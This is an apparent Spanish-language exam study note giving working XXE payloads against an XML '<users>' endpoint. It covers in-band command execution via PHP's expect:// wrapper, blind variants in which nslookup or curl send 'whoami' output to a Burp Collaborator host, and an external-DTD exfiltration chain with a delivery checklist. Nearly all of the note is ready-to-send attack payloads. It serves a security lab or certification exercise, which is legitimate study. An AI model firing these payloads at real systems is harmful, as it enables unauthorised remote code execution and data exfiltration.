---
aliases:
  - XXE whoami OOB (working)
  - xxe expect rce collaborator
tags:
  - vuln/xxe
  - exam
  - working
---

# XXE → `whoami` (RCE vía `expect://`) + OOB a Collaborator

> Trabajo del examen. Base = XML de `<users>` dado. Técnica agnóstica → [[vulnerabilities/006-xxe/xxe|entry point]] · exfil OOB → [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]] · callback → [[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005]]

## Datos fijos
- **Collaborator:** `qlfc37oispb7usur84fk4998wz2qqlea.oastify.com`
- **Comando:** `whoami`
- **Requisito clave:** `whoami` por XXE necesita el wrapper **`expect://`** → solo funciona si el backend es **PHP con la extensión `expect`** cargada. Si no la tiene, no hay RCE por XXE (pasás a leer archivos con `file://`).

> 🟡 Reemplazá `EXPLOIT.exploit-server.net` por tu exploit server. El Collaborator y el `whoami` ya están puestos.

---

## Variante A — In-band (whoami reflejado en `<username>`)
**Usar si** la respuesta refleja el `username` (te devuelve la lista de usuarios). Es la más directa: ves la salida de `whoami` en el HTML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "expect://whoami"> ]>
<users>
    <user>
        <username>&xxe;</username>
        <email>user1@example.com</email>
    </user>
    <user>
        <username>Example2</username>
        <email>user2@example.com</email>
    </user>
</users>
```
- La entidad general `&xxe;` se resuelve al parsear y ejecuta `whoami`.
- **Verificación:** el `username` del primer user vuelve como el nombre de usuario del sistema (ej. `www-data`).

---

## Variante B — OOB inline, SIN DTD externo (whoami dentro del callback) ⭐
**Usar si** es ciego (no refleja nada) pero querés confirmar RCE + ver el output. En vez de exfiltrar por entidad, hacés que **el propio comando** llame al Collaborator con `whoami` en el subdominio. Sin exploit server.

**DNS (más robusto, sin problema de saltos de línea):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "expect://nslookup$IFS`whoami`.qlfc37oispb7usur84fk4998wz2qqlea.oastify.com"> ]>
<users>
    <user><username>&xxe;</username><email>a@a.com</email></user>
</users>
```

**HTTP (misma idea con curl):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "expect://curl$IFS`whoami`.qlfc37oispb7usur84fk4998wz2qqlea.oastify.com"> ]>
<users>
    <user><username>&xxe;</username><email>a@a.com</email></user>
</users>
```

**Si bloquean entidades generales (`&`)** → misma carga con entidad de parámetro (`%`), disparada dentro del DOCTYPE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY % xxe SYSTEM "expect://nslookup$IFS`whoami`.qlfc37oispb7usur84fk4998wz2qqlea.oastify.com"> %xxe; ]>
<users>
    <user><username>Example1</username><email>user1@example.com</email></user>
</users>
```
- `$IFS` = separador de campos → evita el espacio literal en la URI.
- `` `whoami` `` = command substitution → la salida queda como **subdominio**.
- **Verificación:** Burp → **Collaborator** → **Poll now** → interacción **DNS/HTTP** cuyo subdominio ES la salida de `whoami`.

---

## Variante C — OOB con DTD externo (exfil del output por la URL)
**Usar si** querés el patrón "canónico" de exfil (entidad que lee y manda). Necesita **exploit server** para hospedar el `.dtd`.

**1) `exploit.dtd` (hospedar en el exploit server):**
```dtd
<!ENTITY % cmd SYSTEM "expect://whoami">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://qlfc37oispb7usur84fk4998wz2qqlea.oastify.com/?x=%cmd;'>">
%eval;
%exfil;
```

**2) Request que carga el DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe; ]>
<users>
    <user><username>Example1</username><email>user1@example.com</email></user>
</users>
```
- `&#x25;` = `%` escapado (obligatorio para declarar `%exfil` dinámicamente).
- **Ojo:** `whoami` termina en `\n` → el salto puede romper la URL HTTP. Si no llega limpio, usá la **Variante B (DNS)**.

---

## Checklist de envío
1. `Content-Type: application/xml` en la request.
2. Reemplazá el body original por la variante elegida.
3. **Poll now** en Collaborator para B/C; mirá el HTML para A.
4. Si `expect://` no dispara → el backend no tiene la extensión → no hay RCE, cambiá a `file:///etc/hostname` para probar lectura de archivos ([[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]] / [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]).
